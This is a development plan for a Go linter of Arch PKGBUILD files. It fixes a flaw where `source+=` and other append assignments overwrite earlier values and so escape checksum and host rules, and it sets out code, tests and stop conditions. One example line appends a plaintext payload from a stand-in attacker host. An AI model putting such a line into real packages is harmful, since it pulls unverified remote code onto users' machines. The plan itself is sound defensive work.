# Plan 002: Support `+=` append assignments (`source+=`, `depends+=`, `sha256sums+=`)

> **Executor instructions**: Follow this plan step by step. Run every
> verification command and confirm the expected result before moving on. If a
> "STOP condition" occurs, stop and report — do not improvise. When done,
> update this plan's status row in `plans/README.md`.
>
> **Drift check (run first)**: `git diff --stat 8965fc1..HEAD -- internal/pkgbuild/pkgbuild.go`
> If `pkgbuild.go` changed since this plan was written, compare the excerpts
> below against the live code; on a mismatch, treat it as a STOP condition.

## Status

- **Priority**: P1
- **Effort**: M
- **Risk**: MED — touches the `Var` model that every rule reads. Mitigated:
  the new behavior only activates for `+=` assignments; plain `=` assignments
  are byte-for-byte unchanged.
- **Depends on**: 001 (characterization tests must exist first)
- **Category**: correctness / security-relevant (a source added via `+=` is
  currently invisible to every integrity rule)
- **Planned at**: commit `8965fc1`, 2026-08-26

## Why this matters

`extractTopLevel` records every top-level assignment into `p.Vars`, keyed by
name, and **unconditionally overwrites** on collision. Bash's `+=` operator
*appends*. So a PKGBUILD like:

```bash
source=("https://example.com/legit.tar.gz")
source+=("http://evil.example/payload.sh")   # appended, unpinned, plaintext
sha256sums=('abcd...')
sha256sums+=('SKIP')
```

parses as if only the `+=` line existed — the *first* `source=` array is thrown
away. Depending on evaluation order the linter sees the wrong set of sources
entirely. For a security linter this is a correctness hole with teeth: a source
appended via `+=` can escape checksum, protocol, and host rules, and a
`depends+=`/`makedepends+=` line vanishes from consistency checks. `+=` is
common in real PKGBUILDs (per-arch appends, conditional appends).

## Current state

`internal/pkgbuild/pkgbuild.go`, `Var` (lines 19–26):

```go
type Var struct {
	Name   string
	Values []string // rendered values; one element for scalar assignments
	Array  bool
	Pos    syntax.Pos
	Assign *syntax.Assign // underlying AST node, for byte-offset edits
}
```

`extractTopLevel`'s `record` closure (lines 135–151) — note the final line
**overwrites** unconditionally and never inspects `as.Append`:

```go
record := func(as *syntax.Assign) {
	if as.Name == nil {
		return
	}
	v := &Var{Name: as.Name.Value, Pos: as.Pos(), Assign: as}
	if as.Array != nil {
		v.Array = true
		for _, el := range as.Array.Elems {
			s, _ := RenderWord(el.Value, nil)
			v.Values = append(v.Values, s)
		}
	} else if as.Value != nil {
		s, _ := RenderWord(as.Value, nil)
		v.Values = []string{s}
	}
	p.Vars[v.Name] = v   // <-- overwrites; `source+=` clobbers `source=`
}
```

`*syntax.Assign` (from `mvdan.cc/sh/v3/syntax`) has an `Append bool` field that
is `true` exactly when the source used `+=`. Confirm this before editing:

```
go doc mvdan.cc/sh/v3/syntax.Assign
```

Expected output includes `Append bool`. (If it does not, STOP — the dependency
version differs from what this plan assumed.)

Downstream readers that will immediately benefit, no change needed in them:
`Sources()` (source.go:33 — iterates `v.Values`), `Checksums`/`SumsFor`
(source.go:144,160), `installFiles` (pkgbuild.go:204), `Scalar`/`Expand`.

## Commands you will need

| Purpose        | Command                                          | Expected            |
|----------------|--------------------------------------------------|---------------------|
| Confirm field  | `go doc mvdan.cc/sh/v3/syntax.Assign`            | shows `Append bool` |
| Build          | `go build ./...`                                 | exit 0              |
| Vet            | `go vet ./...`                                    | exit 0              |
| Format         | `gofmt -w internal/pkgbuild/pkgbuild.go` then `test -z "$(gofmt -l .)"` | no output |
| Package test   | `go test ./internal/pkgbuild/`                   | `ok`                |
| Full test      | `go test -race ./...`                            | all pass            |
| Golden refresh | `go test -run TestGolden -update ./...` (only if goldens legitimately change — see Step 4) | rewrites `testdata/*/expected.txt` |

## Scope

**In scope**:
- `internal/pkgbuild/pkgbuild.go` — the `record` closure + a small merge helper.
- `internal/pkgbuild/pkgbuild_test.go` — new test cases (file created by 001).

**Out of scope**:
- Do NOT change the `Var` struct's fields. The merge keeps the first
  assignment's `Pos`/`Assign` for identity; per-element positions are plan
  003's concern.
- Do NOT touch `Sources()`, `fix.go`, or any rule file.

## Git workflow

- Branch `advisor/002-source-append`. Imperative capitalized commit subject
  (e.g. "Merge += append assignments in extractTopLevel"). AI executors append
  `Co-Authored-By: Claude <noreply@anthropic.com>`. Do not push/PR unless asked.

## Steps

### Step 1: Confirm the AST field

Run `go doc mvdan.cc/sh/v3/syntax.Assign` and confirm `Append bool` is present.
If absent → STOP.

### Step 2: Implement append-merge in `record`

In `internal/pkgbuild/pkgbuild.go`, replace the final line of the `record`
closure (`p.Vars[v.Name] = v`) with append-aware logic, and add a package-level
helper. Semantics to implement:

- **Array `+=`** (`as.Array != nil` and a prior Var exists): the result is an
  array whose `Values` = prior values followed by the new elements.
- **Scalar `+=`** (`as.Value != nil`): bash concatenates, so the result's single
  value is `strings.Join(prev.Values,"") + strings.Join(new.Values,"")`.
- **`+=` with no prior assignment**: behave exactly as a plain `=` (bash treats
  appending to an unset variable as assignment). i.e. just store `v`.
- **Array-vs-scalar mismatch** (e.g. scalar `x=1` then `x+=(a b)`): treat the
  result as an array (`Array = true`) with values = prior values ++ new values.
  This is a rare/degenerate case; keeping both sets of values is the safe,
  non-lossy choice.
- The merged Var keeps `prev.Pos` and `prev.Assign` (identity = the first
  assignment). Document with a comment that byte-offset edits and per-element
  positions therefore anchor to the first assignment; appended elements fall
  back to it. (Plan 003 relies on this and bounds-checks accordingly.)

Suggested implementation:

```go
	if as.Append {
		if prev, ok := p.Vars[v.Name]; ok {
			p.Vars[v.Name] = mergeAppend(prev, v)
			return
		}
	}
	p.Vars[v.Name] = v
```

```go
// mergeAppend combines a prior top-level assignment with a later `+=` append
// to the same name. The result keeps the first assignment's position and AST
// node (for byte-offset edits); appended values are concatenated. If either
// side is an array, the merged value is an array — matching bash, where
// `arr+=(x)` appends and `str+=x` concatenates.
func mergeAppend(prev, add *Var) *Var {
	out := &Var{Name: prev.Name, Pos: prev.Pos, Assign: prev.Assign, Array: prev.Array || add.Array}
	if out.Array {
		out.Values = append(append([]string{}, prev.Values...), add.Values...)
	} else {
		out.Values = []string{strings.Join(prev.Values, "") + strings.Join(add.Values, "")}
	}
	return out
}
```

`strings` is already imported (line 14).

**Verify**: `go build ./...` → exit 0; `go vet ./...` → exit 0.

### Step 3: Add regression tests

In `internal/pkgbuild/pkgbuild_test.go`, add cases (load via `Load(t.TempDir())`,
see the 001 helpers):

1. **Array append is order-preserving**: PKGBUILD with `source=("a")` then
   `source+=("b" "c")` → `Package.Sources()` yields three entries whose `URL`s
   (or `Raw`) are `a`,`b`,`c` in that order, all with `Arch==""`.
2. **Append with no base**: only `source+=("only")` present → one source `only`.
3. **Checksums append pairs correctly**: `source=("a" "b")`,
   `sha256sums=('AAAA')`, `sha256sums+=('BBBB')` → for the entry at index 1,
   `SumsFor` includes `BBBB`.
4. **Scalar concatenation**: `_x=foo` then `_x+=bar` → `Scalar("_x")` == `foobar`.
5. **Differential rules test** (in `internal/rules/rules_test.go`-style — put it
   in a NEW file `internal/pkgbuild/append_rules_test.go` under
   `package pkgbuild_test`, OR extend the rules test suite): build two
   PKGBUILDs that are identical except one puts a problematic source in the base
   `source=(...)` array and the other appends it via `source+=(...)`. Run the
   full rule set (`rules.Run(pkg, nil)`) over both and assert the finding set is
   the same. Pick a source that trips a source rule (e.g. a plaintext
   `http://` URL, or a source with no matching checksum). Discover the exact
   rule ID by running `go run . --rules` and reading which rule fires on the
   base-array version, then assert it also fires on the `+=` version. This is
   the test that proves the security hole is closed without hard-coding a rule
   ID you can't verify.

**Verify**: `go test ./internal/pkgbuild/ ./internal/rules/` → `ok`.

### Step 4: Check golden fixtures

The golden fixtures (`testdata/clean/PKGBUILD`, `testdata/malicious/PKGBUILD`)
may or may not use `+=`. Run:

```
grep -n '+=' testdata/clean/PKGBUILD testdata/malicious/PKGBUILD
```

- If neither uses `+=`, the golden output is unchanged — run
  `go test -race ./...` and confirm `TestGolden` still passes without `-update`.
- If a fixture uses `+=`, then this fix legitimately changes what the linter
  sees. Run `go test -run TestGolden -update ./...`, then **read the diff**
  (`git diff testdata/`) and confirm every changed line reflects the newly-seen
  appended sources (more findings, or corrected ones) — not a regression. Only
  keep the update if the diff is explainable by this change.

### Step 5: Full verification

- `go build ./...` → 0
- `go vet ./...` → 0
- `test -z "$(gofmt -l .)"` → no output
- `go test -race ./...` → all pass

## Test plan

- New cases as in Step 3. The differential rules test (case 5) is the
  load-bearing one — it demonstrates a previously-invisible malicious source is
  now caught.
- Do not delete or weaken any 001 characterization test; if one asserted the old
  overwrite behavior, that assertion was explicitly forbidden by 001 — report it
  as a STOP condition instead of "fixing" it silently.

## Done criteria

- [ ] `go doc` confirmed `Append bool` exists
- [ ] `+=` array appends now accumulate (test case 1 passes)
- [ ] Differential rules test (case 5) proves an appended problematic source is
      caught identically to a base-array one
- [ ] `go build`, `go vet`, `gofmt -l`, `go test -race ./...` all clean
- [ ] Golden fixtures either unchanged, or updated with a diff explained solely
      by this change
- [ ] `plans/README.md` row for 002 → DONE

## STOP conditions

- `go doc` does not show `Append bool` (dependency drift).
- A 001 characterization test asserts the old overwrite behavior (should not
  exist — report it).
- The golden diff in Step 4 shows changes you cannot attribute to append
  handling (something else regressed).
- The differential test (case 5) shows the appended source is *still* invisible
  after your change — your merge isn't reaching `Sources()`; re-check that you
  kept `Array` true and appended to `Values`.

## Maintenance notes

- Known, accepted limitation (documented in the `mergeAppend` comment):
  auto-fix byte edits and per-element source positions anchor to the *first*
  assignment. Plan 003 bounds-checks element indices against
  `v.Assign.Array.Elems` and falls back to `v.Pos`, so appended elements report
  the array's start line rather than their own — strictly no worse than today.
- Follow-up worth considering later: track per-value provenance
  (`Assign`+`Pos` per element) so appended elements get exact positions and
  fixes. Out of scope here to keep the model change minimal.
